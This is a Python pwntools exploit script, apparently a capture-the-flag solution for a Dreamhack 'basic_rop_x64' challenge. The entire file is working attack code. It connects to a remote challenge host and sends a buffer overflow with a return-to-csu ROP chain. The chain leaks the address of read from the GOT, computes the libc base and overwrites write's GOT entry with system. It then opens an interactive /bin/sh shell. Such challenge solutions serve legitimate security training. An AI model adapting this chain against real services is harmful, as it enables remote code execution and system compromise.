from pwn import *

def log(a, b):
    return success(": ".join([a, hex(b)]))

p = remote("host3.dreamhack.games", 13845)
e = ELF("./basic_rop_x64")
libc = ELF("./libc.so.6")

read_got = e.got["read"]
write_got = e.got["write"]

read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]

binsh = e.bss()

libc_csu1 = 0x40087a
libc_csu2 = 0x400860

#write(0, read_got, 1)
payload = b'A'*0x40 + b'B'*0x8
payload += p64(libc_csu1)
payload += p64(0)
payload += p64(1)
payload += p64(write_got)
payload += p64(8)
payload += p64(read_got)
payload += p64(1)
payload += p64(libc_csu2)

#read(0, binsh, 0x8)
payload += b'A'*0x8
payload += p64(0)
payload += p64(1)
payload += p64(read_got)
payload += p64(8)
payload += p64(binsh)
payload += p64(0)
payload += p64(libc_csu2)

#read(0, write_got, 0x8)
payload += b'A'*0x8
payload += p64(0)
payload += p64(1)
payload += p64(read_got)
payload += p64(8)
payload += p64(write_got)
payload += p64(0)
payload += p64(libc_csu2)

#write("/bin/sh")
payload += b'A'*0x8
payload += p64(0)
payload += p64(1)
payload += p64(write_got)
payload += p64(0)
payload += p64(0)
payload += p64(binsh)
payload += p64(libc_csu2)

p.sendline(payload)
p.recv(0x40)
read_address = u64(p.recvn(6).ljust(8, b'\x00'))
log("read_address", read_address)

libc_base = read_address - read_offset
system_address = libc_base + system_offset

log("libc_base", libc_base)
log("system_address", system_address)

p.send(b"/bin/sh\x00")
p.sendline(p64(system_address))

p.interactive()
